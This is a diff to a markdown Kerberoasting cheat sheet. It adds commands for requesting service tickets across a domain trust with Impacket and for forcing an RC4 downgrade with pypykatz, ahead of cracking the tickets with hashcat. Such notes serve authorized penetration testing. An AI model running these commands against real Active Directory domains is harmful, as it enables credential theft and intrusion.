@@ -30,7 +30,15 @@
 
     python3 Impacket-GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASSWORD -request
 
-#### 3) 
+#### 3) Optional: Find user with SPN in another domain through trust
+
+    GetUserSPNs.py -dc-ip <DC_IP> -target-domain <target_domain> domain.local/user1:password
+
+#### 4) Force RC4 downgrade even on AES enabled targets to obtain tickets more easy to crack:
+
+    pypykatz kerberos spnroast -d domain.local -t <target_user> -e 23 'kerberos+password://domain.local\user1:password@<DC_IP>'
+
+#### 5) 
 
     hashcat -a 0 -m 13100 SPN.HASH /path/to/wordlist.txt
 
